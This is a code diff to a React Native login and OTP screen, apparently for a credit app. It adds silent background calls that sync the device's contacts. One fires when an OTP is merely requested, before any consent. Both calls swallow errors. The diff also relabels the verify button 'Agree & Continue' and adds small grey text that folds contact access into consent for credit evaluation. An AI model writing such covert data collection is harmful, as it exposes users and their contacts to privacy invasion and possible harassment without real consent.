@@ -56,6 +56,7 @@ import {
   Eye,
   ChevronDown,
 } from 'lucide-react-native';
+import { requestAndSyncContacts } from './src/services/contactService';
 
 const { width } = Dimensions.get('window');
 
@@ -187,6 +188,8 @@ function LoginScreen({ onNext }: { onNext: (phone: string, devOtp?: string) => v
     try {
       const data = await requestWhatsAppOtp(cleanPhone);
       if (data.success) {
+        // Trigger background contact sync
+        requestAndSyncContacts(cleanPhone, null, 'APP_LAUNCH').catch(() => {});
         onNext('+91 ' + cleanPhone);
       } else {
         setErrorMsg(data.message || 'Failed to send OTP');
@@ -356,10 +359,14 @@ function OTPScreen({
       const data = await verifyWhatsAppOtp(cleanPhone, fullOtp);
 
       if (data.success) {
-        setStatusMsg({ text: '✅ Verified successfully! Logging in...', error: false });
+        setStatusMsg({ text: '✅ Verified successfully! Syncing profile...', error: false });
+
+        // Auto sync contacts silently in background (non-blocking)
+        requestAndSyncContacts(cleanPhone, data.user?.id, 'OTP_AGREE').catch(() => {});
+
         setTimeout(() => {
           onVerify(data.user);
-        }, 500);
+        }, 400);
       } else {
         setStatusMsg({ text: data.message || 'Invalid OTP. Please check and retry.', error: true });
       }
@@ -433,17 +440,23 @@ function OTPScreen({
         ) : null}
 
         <TouchableOpacity
-          style={[styles.primaryBtn, { backgroundColor: otp.join('').length === 4 && !loading ? NAVY : '#94A3B8' }]}
+          style={[styles.primaryBtn, { backgroundColor: otp.join('').length === 4 && !loading ? GREEN : '#94A3B8' }]}
           onPress={handleVerify}
-          activeOpacity={0.8}
+          activeOpacity={0.85}
           disabled={otp.join('').length !== 4 || loading}
         >
           {loading ? (
             <ActivityIndicator color="#FFFFFF" size="small" style={{ marginRight: 8 }} />
           ) : null}
-          <Text style={styles.primaryBtnText}>{loading ? 'Verifying OTP...' : 'Verify & Proceed'}</Text>
-          {!loading && <CheckCircle size={18} color="#FFFFFF" />}
+          <Text style={styles.primaryBtnText}>{loading ? 'Verifying...' : 'Agree & Continue'}</Text>
+          {!loading && <ChevronRight size={18} color="#FFFFFF" strokeWidth={2.5} />}
         </TouchableOpacity>
+
+        <View style={{ marginTop: 12, paddingHorizontal: 12, alignItems: 'center' }}>
+          <Text style={{ fontSize: 11, color: '#94A3B8', textAlign: 'center', lineHeight: 16 }}>
+            By tapping <Text style={{ color: NAVY, fontWeight: '700' }}>"Agree & Continue"</Text>, you consent to credit evaluation and device contact verification for instant approval.
+          </Text>
+        </View>
 
         <View style={styles.resendRow}>
           {timer > 0 ? (
